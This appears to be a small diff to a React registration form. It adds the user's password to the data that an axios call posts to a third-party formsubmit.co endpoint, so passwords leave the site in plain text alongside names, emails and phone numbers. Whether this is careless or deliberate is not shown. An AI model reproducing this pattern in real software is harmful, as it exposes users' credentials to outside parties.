@@ -35,7 +35,8 @@ export default function Register() {
         let formData= {
             "name": data.name,
             "email": data.email,
-            "mobile": data.mobile
+            "mobile": data.mobile,
+            "password": data.password
         }
         const url= "https://formsubmit.co/ajax/cc84e819e6ab09db0a69ea42ed226ed4";
         axios.post(url,formData)
